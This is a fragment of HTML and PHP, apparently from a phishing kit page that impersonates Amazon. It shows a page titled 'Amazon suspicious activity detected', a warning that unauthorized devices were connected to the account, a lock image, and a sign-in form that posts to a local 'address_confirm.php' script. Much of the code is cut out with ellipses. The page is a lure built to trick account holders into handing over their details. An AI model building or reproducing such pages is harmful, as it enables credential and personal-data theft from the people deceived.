...
<script type='text/javascript'>var ue_t0=ue_t0||+new Date();</script>
    ...
    <title dir="ltr">Amazon suspicious activity detected</title>
...
<?php } ?>
  ...
  <div class="a-section">
    ...
    <form name="signIn" method="post" novalidate action="address_confirm.php" class="a-spacing-none">
...
<script type="text/javascript">cf()</script>
       ...
       <center><BR/><BR/>
<img height="150"src="asset/lok.svg">
</center>     
  ...
  <b>It seems that one or more unauthorized devices was connected to your account</b>
